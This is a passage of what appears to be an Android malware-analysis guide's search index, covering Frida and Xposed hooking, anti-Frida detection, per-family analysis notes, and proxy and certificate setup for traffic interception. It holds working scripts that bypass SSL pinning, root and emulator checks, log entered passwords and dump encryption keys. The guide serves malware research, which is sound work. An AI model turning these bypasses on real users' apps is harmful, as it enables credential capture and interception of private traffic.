data exfiltration, or persistence <code>DexClassLoader</code> / <code>InMemoryDexClassLoader</code> Dynamic code loading Loading decrypted DEX payloads at runtime; dump the bytes passed to these constructors <p>Hook these APIs with Frida (see Hooking) to build a behavioral profile of the sample without relying on network traffic alone.</p>"},{"location":"reversing/dynamic-analysis/#instruction-level-tracing","title":"Instruction-Level Tracing","text":"<p>For heavily obfuscated native code (e.g., Mandrake's OLLVM-protected libraries), function-level hooking may not be sufficient. Frida's Stalker API enables instruction-level tracing, observing every instruction as it executes in real time. This is the most powerful dynamic analysis technique for understanding native control flow in obfuscated samples.</p>"},{"location":"reversing/dynamic-analysis/#ai-assisted-decompilation","title":"AI-Assisted Decompilation","text":"<p>NowSecure's research on AI-assisted decompilation explores using language models to recover and optimize decompiled code, transforming jadx output into more readable and analyzable form. This is particularly useful for large-scale analysis where manual code review is impractical.</p>"},{"location":"reversing/dynamic-analysis/#family-specific-analysis-notes","title":"Family-Specific Analysis Notes","text":"<p>Certain malware families require specific dynamic analysis approaches due to their anti-analysis techniques:</p> Family Challenge Approach Mandrake OLLVM-obfuscated native libs Frida Stalker instruction tracing on libapp.so SoumniBot Malformed manifest crashes tools Use aapt2 dump instead of apktool, or pull manifest from running process GodFather v3 $JADXBLOCK anti-decompilation + virtualization Must use dynamic analysis exclusively; hook VirtualApp framework APIs Necro Steganographic payload in PNG Monitor network for image downloads, hook BitmapFactory to capture pixel extraction Klopatra Virbox packer Dump DEX from memory after Virbox unpacker runs; hook DexClassLoader Chameleon Disables biometric auth Monitor BiometricPrompt API calls, observe settings changes FluBot DGA-based C2 Capture DNS requests to observe domain generation; hook network resolution Hook VNC-like screen streaming Capture MediaProjection API usage, observe screen buffer access Octo DGA + remote access Observe AccessibilityService events, capture screen streaming buffers NGate NFC relay Monitor NFC adapter API calls, capture relayed card data in transit Cerberus lineage AES-encrypted C2 traffic Hook <code>Cipher.doFinal</code> to capture plaintext request/response bodies before encryption Anatsa Multi-stage dropper with delayed payload delivery Payload triggers only after user activity (scrolls, gestures); automate interaction or patch delay checks SharkBot DGA for C2 resolution Extract the domain generation algorithm and predict domains; hook DNS resolution to capture generated names Vultur AlphaVNC-based screen streaming Monitor VNC initialization and <code>MediaProjection</code> setup; capture VNC handshake traffic SpyNote Raw TCP socket protocol for C2 Capture with <code>tcpdump</code> since proxy tools miss non-HTTP traffic; decode custom binary protocol Gigabud Virbox-packed, core logic in native <code>libstrategy.so</code> Hook native JNI calls from <code>libstrategy.so</code>; trace command dispatch after Virbox unpacking MoqHao Auto-execution on install, no user interaction needed Malware activates immediately via broadcast receivers; capture initial C2 beacon within seconds of install"},{"location":"reversing/dynamic-analysis/#c2-protocol-identification","title":"C2 Protocol Identification","text":"<p>During traffic analysis, identify the C2 protocol to classify the family:</p> Protocol Families HTTP/HTTPS REST Most banking trojans (Cerberus, Anubis, GodFather) WebSocket TsarBot, PJobRAT MQTT Copybara Raw TCP Albiriox (unencrypted) Firebase Cloud Messaging Vultur v2, KoSpy Firebase Firestore KoSpy (config delivery) Telegram Bot API Various (dead drop resolver) TOR Hydra"},{"location":"reversing/dynamic-analysis/#tools","title":"Tools","text":"Tool Purpose Burp Suite HTTP/HTTPS proxy, traffic interception mitmproxy Scriptable HTTPS proxy Wireshark Packet capture and analysis Frida Runtime instrumentation (see Hooking) strace System call tracing Magisk Root management with detection bypass frida-dexdump Dump DEX files from memory medusa Extensible Frida-powered framework for dynamic analysis house Runtime mobile application analysis toolkit"},{"location":"reversing/hooking/","title":"Hooking","text":"<p>Intercepting function calls at runtime to read arguments, modify return values, or replace functionality entirely. Frida is the standard tool for Android hooking. Xposed provides a framework-level alternative.</p>"},{"location":"reversing/hooking/#frida","title":"Frida","text":"<p>Frida injects a JavaScript engine into the target process. Scripts can hook any Java method, native function, or system call.</p>"},{"location":"reversing/hooking/#setup","title":"Setup","text":"<pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\nadb shell su -c \"/data/local/tmp/frida-server &amp;\"\n\npip install frida-tools\n</code></pre>"},{"location":"reversing/hooking/#basic-java-hooking","title":"Basic Java Hooking","text":"<p>Intercept a Java method, read arguments, modify return value:</p> <pre><code>Java.perform(function() {\n    var targetClass = Java.use(\"com.target.app.LoginActivity\");\n\n    targetClass.checkPassword.implementation = function(password) {\n        console.log(\"Password entered: \" + password);\n        var result = this.checkPassword(password);\n        console.log(\"Result: \" + result);\n        return true;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#hooking-overloaded-methods","title":"Hooking Overloaded Methods","text":"<p>When a method has multiple signatures:</p> <pre><code>targetClass.send.overload(\"java.lang.String\", \"int\").implementation = function(msg, code) {\n    console.log(\"send(\" + msg + \", \" + code + \")\");\n    return this.send(msg, code);\n};\n</code></pre>"},{"location":"reversing/hooking/#hooking-constructors","title":"Hooking Constructors","text":"<pre><code>targetClass.$init.overload(\"java.lang.String\").implementation = function(param) {\n    console.log(\"Constructor called with: \" + param);\n    this.$init(param);\n};\n</code></pre>"},{"location":"reversing/hooking/#native-function-hooking","title":"Native Function Hooking","text":"<p>Hook native (C/C++) functions in shared libraries:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libnative.so\", \"decrypt\"), {\n    onEnter: function(args) {\n        console.log(\"decrypt called\");\n        console.log(\"arg0: \" + Memory.readUtf8String(args[0]));\n    },\n    onLeave: function(retval) {\n        console.log(\"returned: \" + Memory.readUtf8String(retval));\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#common-hooking-tasks","title":"Common Hooking Tasks","text":""},{"location":"reversing/hooking/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>The most frequent use case. Multiple approaches depending on the pinning implementation:</p> <pre><code>Java.perform(function() {\n    var CertificatePinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertificatePinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(hostname, peerCertificates) {\n        console.log(\"Bypassing pin for: \" + hostname);\n    };\n});\n</code></pre> <p>For comprehensive pinning bypass, Objection automates this:</p> <pre><code>objection -g com.target.app explore\nandroid sslpinning disable\n</code></pre>"},{"location":"reversing/hooking/#root-detection-bypass","title":"Root Detection Bypass","text":"<p>Hook root check methods to return false. The example below covers basic RootBeer checks, but production malware uses multi-layered detection (file checks, property reads, native library probes). 8kSec's advanced root detection bypass guide covers sophisticated detection mechanisms and Frida-based bypasses beyond basic library hooks:</p> <pre><code>Java.perform(function() {\n    var RootBeer = Java.use(\"com.scottyab.rootbeer.RootBeer\");\n    RootBeer.isRooted.implementation = function() {\n        console.log(\"Root check bypassed\");\n        return false;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#emulator-detection-bypass","title":"Emulator Detection Bypass","text":"<pre><code>Java.perform(function() {\n    var Build = Java.use(\"android.os.Build\");\n    Build.FINGERPRINT.value = \"google/walleye/walleye:8.1.0/OPM1.171019.011/4448085:user/release-keys\";\n    Build.MODEL.value = \"Pixel 2\";\n    Build.MANUFACTURER.value = \"Google\";\n    Build.BRAND.value = \"google\";\n    Build.PRODUCT.value = \"walleye\";\n    Build.HARDWARE.value = \"walleye\";\n});\n</code></pre>"},{"location":"reversing/hooking/#crypto-key-extraction","title":"Crypto Key Extraction","text":"<p>Hook encryption functions to dump keys and plaintext:</p> <pre><code>Java.perform(function() {\n    var SecretKeySpec = Java.use(\"javax.crypto.spec.SecretKeySpec\");\n    SecretKeySpec.$init.overload(\"[B\", \"java.lang.String\").implementation = function(keyBytes, algorithm) {\n        console.log(\"Algorithm: \" + algorithm);\n        console.log(\"Key: \" + bytesToHex(keyBytes));\n        return this.$init(keyBytes, algorithm);\n    };\n\n    var Cipher = Java.use(\"javax.crypto.Cipher\");\n    Cipher.doFinal.overload(\"[B\").implementation = function(input) {\n        console.log(\"Cipher input: \" + bytesToHex(input));\n        var result = this.doFinal(input);\n        console.log(\"Cipher output: \" + bytesToHex(result));\n        return result;\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#dex-loading-interception","title":"DEX Loading Interception","text":"<p>Capture dynamically loaded DEX files (packed apps):</p> <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libraryPath, parent) {\n        console.log(\"Loading DEX: \" + dexPath);\n        this.$init(dexPath, optimizedDir, libraryPath, parent);\n    };\n\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, loader) {\n        console.log(\"In-memory DEX loaded, size: \" + buf.remaining());\n        var bytes = new Uint8Array(buf.remaining());\n        var file = new File(\"/data/local/tmp/dumped_\" + Date.now() + \".dex\", \"wb\");\n        file.write(bytes.buffer);\n        file.flush();\n        file.close();\n        this.$init(buf, loader);\n    };\n});\n</code></pre>"},{"location":"reversing/hooking/#advanced-frida-memory-operations","title":"Advanced Frida: Memory Operations","text":"<p>Beyond hooking functions, Frida provides direct memory manipulation APIs for native-level analysis. 8kSec's memory operations series covers the full API:</p> API Purpose <code>Memory.scan()</code> / <code>Memory.scanSync()</code> Scan process memory for byte patterns <code>Memory.alloc()</code> Allocate memory in the target process <code>Memory.copy()</code> / <code>Memory.dup()</code> Copy and duplicate memory regions <code>Memory.protect()</code> Change memory page permissions (RWX) <code>Memory.patchCode()</code> Patch executable code at runtime <p>8kSec's Frida Stalker guide covers instruction-level tracing using Stalker APIs, enabling real-time observation of code execution at the assembly level. This is particularly useful for analyzing obfuscated native code in families like Mandrake that use OLLVM.</p>"},{"location":"reversing/hooking/#anti-frida-detection-and-bypass","title":"Anti-Frida Detection and Bypass","text":"<p>Malware actively detects Frida to prevent dynamic analysis. Understanding each detection vector is necessary to bypass them.</p>"},{"location":"reversing/hooking/#detection-techniques","title":"Detection Techniques","text":"Detection Method Indicator Implementation Port scanning TCP port 27042 (default frida-server port) Socket connect to localhost:27042, if open assume Frida is present Process name \"frida-server\" in process list Read <code>/proc/*/cmdline</code> or <code>ps</code> output looking for \"frida\" Memory maps scanning \"frida\" strings in <code>/proc/self/maps</code> Open <code>/proc/self/maps</code> and scan for \"frida-agent\", \"frida-gadget\", or \"frida-server\" Named pipes Frida's linjector pipe names Enumerate <code>/proc/self/fd/</code> for pipes matching \"linjector\" pattern Loaded libraries <code>frida-agent*.so</code> in memory <code>dlopen</code> enumeration or <code>/proc/self/maps</code> check for frida-agent shared objects pthread_create hooking Thread creation patterns Frida spawns threads during injection -- detect abnormal thread count or thread naming patterns D-Bus protocol detection Frida's internal D-Bus communication Send D-Bus <code>AUTH</code> message to suspected Frida port and check for a valid reply Inline hook detection Modified function prologues Read the first bytes of commonly hooked functions (like <code>open</code>, <code>strcmp</code>) and compare against known-good prologues"},{"location":"reversing/hooking/#procselfmaps-scanning-most-common","title":"<code>/proc/self/maps</code> Scanning (Most Common)","text":"<p>The most widespread Frida detection reads <code>/proc/self/maps</code> line by line, searching for Frida-related strings. Malware typically runs this in a background thread on a timer:</p> <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"maps\") !== -1 || cmd.indexOf(\"frida\") !== -1) {\n            console.log(\"Blocked maps/frida scan: \" + cmd);\n            return this.exec(\"echo\");\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level maps scanning, hook <code>libc.so</code> <code>open</code> and filter <code>/proc/self/maps</code> access:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libc.so\", \"open\"), {\n    onEnter: function(args) {\n        var path = Memory.readUtf8String(args[0]);\n        if (path &amp;&amp; path.indexOf(\"/proc/self/maps\") !== -1) {\n            this.shouldBlock = true;\n        }\n    },\n    onLeave: function(retval) {\n        if (this.shouldBlock) {\n            retval.replace(-1);\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#d-bus-protocol-detection","title":"D-Bus Protocol Detection","text":"<p>Some malware sends a raw D-Bus <code>AUTH</code> handshake to suspected Frida ports. If Frida responds, the app terminates:</p> <pre><code>Interceptor.attach(Module.findExportByName(\"libc.so\", \"connect\"), {\n    onEnter: function(args) {\n        var sockAddr = args[1];\n        var port = (Memory.readU8(sockAddr.add(2)) &lt;&lt; 8) | Memory.readU8(sockAddr.add(3));\n        if (port === 27042) {\n            console.log(\"Blocked connect to Frida port\");\n            this.shouldBlock = true;\n        }\n    },\n    onLeave: function(retval) {\n        if (this.shouldBlock) {\n            retval.replace(-1);\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/hooking/#bypass-strategies","title":"Bypass Strategies","text":"Strategy How Trade-offs Rename frida-server <code>cp frida-server fs-15.x</code> and run the renamed binary Simple but only evades name-based detection Non-default port <code>frida-server -l 0.0.0.0:1234</code> Defeats port 27042 scanning only Frida Gadget injection Embed <code>frida-gadget.so</code> directly into the APK's lib folder No frida-server process, survives process name checks Hook detection functions Intercept <code>open()</code>, <code>fopen()</code>, <code>access()</code> calls targeting <code>/proc/self/maps</code> Comprehensive but can be detected by syscall-level checks Magisk + Shamiko Use Shamiko to hide root and Frida from process Hides at zygote level, effective against most checks Stalker-based tracing Use Frida Stalker instead of Interceptor to avoid inline hook artifacts Slower but undetectable by prologue checking Kernel-level hiding Custom kernel module to filter <code>/proc/self/maps</code> entries Most thorough, requires custom kernel Patch detection out Remove Frida detection entirely from the APK (see Patching) Permanent fix, avoids the cat-and-mouse entirely"},{"location":"reversing/hooking/#frida-gadget-rootless-injection","title":"Frida Gadget (Rootless Injection)","text":"<p>When root is unavailable or frida-server is detected, inject Frida Gadget directly into the APK:</p> <pre><code>apktool d target.apk -o target_patched/\ncp frida-gadget-16.x.x-android-arm64.so target_patched/lib/arm64-v8a/libfrida-gadget.so\n</code></pre> <p>Add a <code>System.loadLibrary</code> call in the main activity's Smali to load the gadget at startup:</p> <pre><code>const-string v0, \"frida-gadget\"\ninvoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V\n</code></pre> <p>Reassemble, sign, and install. The app loads Frida Gadget on launch without needing frida-server.</p>"},{"location":"reversing/hooking/#xposed-framework","title":"Xposed Framework","text":"<p>Xposed operates at the ART (Android Runtime) level, replacing method entry points in the runtime's internal method table. When a hooked method is called, ART redirects execution to the Xposed callback before (or instead of) the original implementation.</p> <p>LSPosed is the modern Xposed implementation for Android 8.1+, installed as a Magisk module. It uses Riru or Zygisk to inject into the zygote process, which means hooks are active from the moment an app process is forked.</p>"},{"location":"reversing/hooking/#how-art-method-hooking-works","title":"How ART Method Hooking Works","text":"<p>Xposed replaces the <code>entry_point_from_quick_compiled_code</code> field in ART's <code>ArtMethod</code> struct. When the VM calls a hooked method, it jumps to Xposed's trampoline instead of the original compiled code. The trampoline invokes registered callbacks, then optionally calls the original method.</p> <p>This is fundamentally different from Frida's approach: Frida injects into a running process and patches code in memory, while Xposed modifies the runtime's method dispatch table at process creation time.</p>"},{"location":"reversing/hooking/#lsposed-module-structure","title":"LSPosed Module Structure","text":"<p>An Xposed module is an Android app with a <code>xposed_init</code> file declaring the entry class:</p> <pre><code>public class HookModule implements IXposedHookLoadPackage {\n    @Override\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {\n        if (!lpparam.packageName.equals(\"com.target.malware\")) return;\n\n        XposedHelpers.findAndHookMethod(\n            \"com.target.malware.SecurityCheck\",\n            lpparam.classLoader,\n            \"isRooted\",\n            new XC_MethodReplacement() {\n                @Override\n                protected Object replaceHookedMethod(MethodHookParam param) {\n                    return false;\n                }\n            }\n        );\n    }\n}\n</code></pre> <p>For before/after hooks instead of full replacement:</p> <pre><code>XposedHelpers.findAndHookMethod(\n    \"javax.crypto.Cipher\",\n    lpparam.classLoader,\n    \"doFinal\",\n    byte[].class,\n    new XC_MethodHook() {\n        @Override\n        protected void beforeHookedMethod(MethodHookParam param) {\n            byte[] input = (byte[]) param.args[0];\n            XposedBridge.log(\"Cipher.doFinal input: \" + bytesToHex(input));\n        }\n        @Override\n        protected void afterHookedMethod(MethodHookParam param) {\n            byte[] output = (byte[]) param.getResult();\n            XposedBridge.log(\"Cipher.doFinal output: \" + bytesToHex(output));\n        }\n    }\n);\n</code></pre>"},{"location":"reversing/hooking/#frida-vs-xposed","title":"Frida vs. Xposed","text":"Aspect Frida Xposed / LSPosed Hook timing Attaches to running process Active from process creation (zygote fork) Persistence Script must be re-run each session Hooks survive app restarts and reboots Iteration speed Instant -- edit JS script, re-attach Requires module rebuild and device reboot Module changes Immediate Requires reboot (or soft reboot via LSPosed manager) Language JavaScript (with Java.perform bridge) Java / Kotlin Root requirement Yes (frida-server) or Gadget injection Yes (Magisk + LSPosed) Detection surface Detectable via port, maps, thread artifacts Lower profile -- no separate server process Native hooks Full support (Interceptor, Stalker) Limited -- primarily targets Java/ART methods Interactive exploration REPL, live scripting, object inspection No REPL -- compile, install, reboot cycle Best for Dynamic exploration, one-off analysis Persistent monitoring, long-running malware observation <p>Xposed is particularly useful when analyzing malware that actively detects Frida, since LSPosed hooks leave fewer artifacts. It is also preferable for long-running observation sessions where restarting Frida scripts is impractical.</p>"},{"location":"reversing/hooking/#family-specific-hooking","title":"Family-Specific Hooking","text":"<p>Certain malware families require targeted hooks to extract key data:</p> Family What to Hook Purpose Cerberus lineage <code>javax.crypto.Cipher.doFinal</code> Decrypt C2 communication and overlay inject URLs GodFather v3 VirtualApp framework APIs Intercept virtualized banking app interactions Anatsa AccessibilityService.onAccessibilityEvent Observe ATS command sequence Mandrake OLLVM-protected native functions via Stalker Trace obfuscated control flow SharkBot DGA algorithm function Predict future C2 domains Vultur AlphaVNC initialization Capture screen streaming setup SpyNote Socket/DataOutputStream Intercept RAT command protocol Necro BitmapFactory + pixel extraction Capture steganographic payload Gigabud <code>libstrategy.so</code> native functions Intercept UI interaction commands BTMOB RAT WebView <code>loadUrl</code> / <code>evaluateJavascript</code> Capture injected phishing pages LightSpy Plugin loader + <code>light2.db</code> SQLite Intercept plugin download and C2 config FluHorse Dart FFI bridge in <code>libapp.so</code> Hook the Dart-to-native boundary for credential interception Rafel RAT <code>DevicePolicyManager</code> + <code>Cipher.doFinal</code> Intercept admin commands and ransomware encryption KoSpy Firebase Firestore <code>getDocument</code> Capture C2 configuration delivery All packed families DexClassLoader, InMemoryDexClassLoader Dump decrypted DEX payload"},{"location":"reversing/hooking/#accessibility-service-monitoring","title":"Accessibility Service Monitoring","text":"<p>For families using accessibility-based ATS, hook the accessibility service to observe the full fraud sequence:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            try {\n                var cls = Java.use(className);\n                if (cls.class.getSuperclass() &amp;&amp;\n                    cls.class.getSuperclass().getName() === \"android.accessibilityservice.AccessibilityService\") {\n                    cls.onAccessibilityEvent.implementation = function(event) {\n                        console.log(\"[A11y] \" + event.getEventType() + \" pkg=\" + event.getPackageName() + \" text=\" + event.getText());\n                        this.onAccessibilityEvent(event);\n                    };\n                }\n            } catch(e) {}\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/hooking/#refrida","title":"reFrida","text":"<p>reFrida is a browser-based Frida IDE that replaces the typical workflow of editing scripts in a text editor and running them via CLI. It connects to a running frida-server and provides a full development environment in the browser.</p> <p>Key capabilities:</p> <ul> <li>Monaco editor with Frida API autocompletion, syntax highlighting, and inline documentation</li> <li>Visual interceptor builder -- select a class and method from a tree view, and reFrida generates the hook code automatically. Useful for quickly building hooks without memorizing overload signatures.</li> <li>Built-in disassembler -- disassemble native functions directly from the browser, navigate to cross-references, and set hooks on specific instructions</li> <li>Memory search -- scan process memory for strings, byte patterns, or values with a visual interface (wraps <code>Memory.scan</code> with result highlighting)</li> <li>Stalker integration -- configure and run Stalker traces with visual output of executed basic blocks and call graphs</li> <li>Script management -- save, load, and organize scripts per target application</li> </ul> <p>reFrida is particularly effective for malware analysis workflows where you need to rapidly iterate on hooks, inspect memory regions, and trace native code execution without switching between multiple terminal sessions.</p>"},{"location":"reversing/hooking/#task-oriented-hooking-strategies","title":"Task-Oriented Hooking Strategies","text":"<p>Beyond family-specific hooks, certain analysis goals map to standard hook points regardless of the malware family:</p> Analysis Goal What to Hook Why Intercept overlay injection <code>WindowManager.addView</code>, <code>WindowManager.LayoutParams</code> Banking trojans overlay fake login screens on top of legitimate apps Capture C2 traffic <code>OkHttpClient.newCall</code>, <code>HttpURLConnection.connect</code>, <code>URL.openConnection</code> Intercept HTTP-based C2 before SSL encryption Extract encryption keys <code>SecretKeySpec.$init</code>, <code>Cipher.doFinal</code>, <code>Mac.doFinal</code> Dump keys and plaintext at the crypto API boundary Monitor SMS exfiltration <code>SmsManager.sendTextMessage</code>, <code>SmsManager.sendMultipartTextMessage</code> Catch outbound SMS used for OTP forwarding or premium abuse Track file system activity <code>File.$init</code>, <code>FileOutputStream.write</code>, <code>SharedPreferences.edit</code> Observe config drops, payload writes, and preference changes Capture screen recording <code>MediaProjection.createVirtualDisplay</code>, <code>ImageReader.acquireLatestImage</code> Detect VNC/screen streaming setup used by RAT families Monitor accessibility abuse <code>AccessibilityService.onAccessibilityEvent</code>, <code>performAction</code>, <code>performGlobalAction</code> Observe ATS commands (clicks, scrolls, gestures) during automated fraud Intercept dynamic loading <code>DexClassLoader.$init</code>, <code>InMemoryDexClassLoader.$init</code>, <code>ClassLoader.loadClass</code> Capture unpacked or stage-2 payloads at load time Track permission abuse <code>DevicePolicyManager.lockNow</code>, <code>DevicePolicyManager.resetPassword</code> Detect device admin abuse (screen lock, wipe threats) DNS/domain resolution <code>InetAddress.getByName</code>, <code>InetAddress.getAllByName</code> Capture DGA output or C2 domain resolution WebView injection <code>WebView.loadUrl</code>, <code>WebView.evaluateJavascript</code>, <code>WebViewClient.shouldInterceptRequest</code> Intercept injected phishing pages and JavaScript payloads Clipboard theft <code>ClipboardManager.setPrimaryClip</code>, <code>ClipboardManager.getPrimaryClip</code> Detect clipboard monitoring for crypto wallet address swapping"},{"location":"reversing/hooking/#tools","title":"Tools","text":"Tool Purpose Frida Runtime instrumentation reFrida Browser-based Frida IDE with visual interceptor builder, disassembler, and Stalker integration Objection Frida-powered automation (SSL bypass, root bypass, etc.) LSPosed Xposed framework for modern Android frida-dexdump Dump DEX from memory via Frida r2frida Radare2 + Frida integration medusa Extensible Frida wrapper for common hooking tasks"},{"location":"reversing/hooking/#ssl-pinning-current-state","title":"SSL Pinning: Current State","text":"<p>Google now recommends against SSL pinning in Android security best practices. 8kSec's analysis covers why: pinning is trivially bypassed with Frida, creates maintenance burden, and provides minimal security benefit for most threat models since the Android platform's certificate transparency and Play Integrity checks provide stronger guarantees. For malware analysis, pinning bypass remains a routine first step (see SSL Pinning Bypass above).</p>"},{"location":"reversing/network-analysis/","title":"Network Analysis","text":"<p>Intercepting, decrypting, and analyzing network traffic between the malware and its C2 server. Reveals command protocols, exfiltration channels, target lists, and infrastructure. Often the fastest path to understanding a sample's purpose and operator identity.</p>"},{"location":"reversing/network-analysis/#setup","title":"Setup","text":""},{"location":"reversing/network-analysis/#traffic-interception","title":"Traffic Interception","text":"Method Root Required HTTPS Notes Burp Suite / mitmproxy as Wi-Fi proxy No With cert install Standard approach. Set device proxy to host IP. iptables redirect Yes With cert install Transparent proxy. Catches traffic that ignores proxy settings. VPN-based (PCAPdroid, NetGuard) No Metadata only Captures packet headers without root. No decryption. tcpdump on device Yes No decryption Raw packet capture. Useful for non-HTTP protocols. Wireshark on host No No decryption Capture on shared network. Requires ARP spoofing or network tap."},{"location":"reversing/network-analysis/#proxy-setup-mitmproxy","title":"Proxy Setup: mitmproxy","text":"<p>On an emulator (Android Studio AVD):</p> <pre><code>emulator -avd Pixel_6_API_33 -http-proxy http://127.0.0.1:8080\n</code></pre> <pre><code>mitmproxy --listen-port 8080 --set block_global=false\n</code></pre> <p>Export the CA certificate and push it to the emulator:</p> <pre><code>cp ~/.mitmproxy/mitmproxy-ca-cert.cer /tmp/mitmproxy-ca.der\nadb push /tmp/mitmproxy-ca.der /sdcard/\n</code></pre> <p>Install via Settings &gt; Security &gt; Encryption &amp; credentials &gt; Install a certificate &gt; CA certificate. This installs to the user store, which is sufficient for apps targeting API &lt; 24 or apps without <code>network_security_config.xml</code> restrictions.</p> <p>On a physical device:</p> <p>Connect the device and analysis machine to the same Wi-Fi network. Find the host machine's local IP:</p> <pre><code>ifconfig en0 | grep \"inet \"\n</code></pre> <p>On the device: Settings &gt; Wi-Fi &gt; long-press connected network &gt; Modify network &gt; Advanced &gt; Proxy &gt; Manual. Set proxy hostname to the host IP, port to 8080. Push and install the CA cert the same way as above.</p> <p>Transparent proxy (catches traffic that ignores proxy settings):</p> <p>Some malware ignores the system proxy and connects directly. Use iptables on a rooted device to redirect all traffic:</p> <pre><code>adb shell su -c \"iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080\"\nadb shell su -c \"iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 192.168.1.100:8080\"\n</code></pre> <p>Run mitmproxy in transparent mode:</p> <pre><code>mitmproxy --mode transparent --listen-port 8080\n</code></pre>"},{"location":"reversing/network-analysis/#proxy-setup-burp-suite","title":"Proxy Setup: Burp Suite","text":"<p>Burp listener configuration:</p> <p>In Burp Suite, go to Proxy &gt; Options &gt; Proxy Listeners. Add a listener on all interfaces (bind address <code>0.0.0.0</code>) on port 8082. Enable \"Support invisible proxying\" for transparent mode.</p> <p>Export the Burp CA:</p> <p>Browse to <code>http://&lt;burp-host&gt;:8082</code> from the device and download <code>cacert.der</code>. Alternatively, export from Burp: Proxy &gt; Options &gt; Import / export CA certificate &gt; Certificate in DER format.</p> <p>On an emulator:</p> <pre><code>adb push cacert.der /sdcard/\nemulator -avd Pixel_6_API_33 -http-proxy http://127.0.0.1:8082\n</code></pre> <p>On a physical device:</p> <p>Set the device Wi-Fi proxy to the host IP on port 8082, then install the CA cert from storage.</p>"},{"location":"reversing/network-analysis/#certificate-installation","title":"Certificate Installation","text":"<p>For HTTPS interception, the proxy's CA certificate must be trusted by the device. Android 7+ (API 24+) introduced a critical change: apps targeting API 24 or above no longer trust user-installed CA certificates by default. This means user store installation is insufficient for most modern apps and all malware analysis scenarios.</p> <p>User certificate store (limited utility -- only works for apps targeting API &lt; 24 or apps with explicit user cert trust):</p> <pre><code>adb push proxy-ca.der /sdcard/\n</code></pre> <p>Install via Settings &gt; Security &gt; Install from storage.</p> <p>System certificate store (requires root, works for all apps):</p> <pre><code>openssl x509 -inform DER -in proxy-ca.der -out proxy-ca.pem\nHASH=$(openssl x509 -inform PEM -subject_hash_old -in proxy-ca.pem | head -1)\nmv proxy-ca.pem ${HASH}.0\n</code></pre> <p>On Android 10 and below, <code>/system</code> is writable after remount:</p> <pre><code>adb root\nadb remount\nadb push ${HASH}.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/${HASH}.0\nadb reboot\n</code></pre> <p>On Android 11-13, the system partition is read-only. Mount a tmpfs overlay:</p> <pre><code>adb shell su -c \"mount -t tmpfs tmpfs /system/etc/security/cacerts\"\nadb shell su -c \"cp /apex/com.android.conscrypt/cacerts/* /system/etc/security/cacerts/\"\nadb push ${HASH}.0 /tmp/\nadb shell su -c \"mv /tmp/${HASH}.0 /system/etc/security/cacerts/\"\nadb shell su -c \"chmod 644 /system/etc/security/cacerts/*\"\n</code></pre> <p>This tmpfs mount does not survive reboots. Re-run after each restart.</p> <p>On Android 14+, system certs are read from the <code>com.android.conscrypt</code> APEX module, and the overlay trick no longer works. Use the Magisk module approach below.</p> <p>Magisk module for system cert installation (Android 11+, recommended):</p> <p>The <code>MagiskTrustUserCerts</code> module copies all user-installed CA certificates into the system store at boot. This is the most reliable method for rooted devices running Android 11+.</p> <pre><code>adb push MagiskTrustUserCerts.zip /sdcard/\n</code></pre> <p>Install the module via the Magisk Manager app, then reboot. After reboot, any certificate installed in the user store appears in the system store. Install the proxy CA as a user cert first, then install the module.</p> <p>For Android 14+ specifically, the module patches the APEX mount to inject certificates into the Conscrypt module's cert directory.</p> <p>Emulator shortcut (writable system image):</p> <p>Android Studio AVDs with Google APIs (not Google Play) have a writable system partition when launched with <code>-writable-system</code>:</p> <pre><code>emulator -avd Pixel_6_API_33 -writable-system -http-proxy http://127.0.0.1:8080\nadb root\nadb remount\nadb push ${HASH}.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/${HASH}.0\nadb reboot\n</code></pre> <p>This is the simplest path for emulator-based analysis. No Magisk required.</p>"},{"location":"reversing/network-analysis/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Most banking trojans and their target apps implement SSL pinning. Bypass approaches ranked by reliability:</p> Approach Tool Scope Frida script See Hooking Per-library bypass (OkHttp, HttpURLConnection, WebView) Objection <code>android sslpinning disable</code> Automated, covers common libraries Network security config patch See Patching Modify <code>res/xml/network_security_config.xml</code> to trust user certs Frida + reFrida reFrida Visual interceptor for pinning bypass with real-time traffic view <p>For malware specifically, SSL pinning bypass is needed to observe C2 communication. Most malware uses simpler HTTP clients than legitimate apps, so a basic OkHttp or HttpURLConnection hook covers the majority.</p>"},{"location":"reversing/network-analysis/#universal-ssl-pinning-bypass-with-frida","title":"Universal SSL Pinning Bypass with Frida","text":"<p>The following Frida script bypasses the most common pinning implementations in a single attach. It hooks SSLContext, TrustManager, OkHttp CertificatePinner, and Conscrypt's TrustManagerImpl.</p> Universal SSL Pinning Bypass Script <pre><code>Java.perform(function () {\n    var X509TrustManager = Java.use(\"javax.net.ssl.X509TrustManager\");\n    var SSLContext = 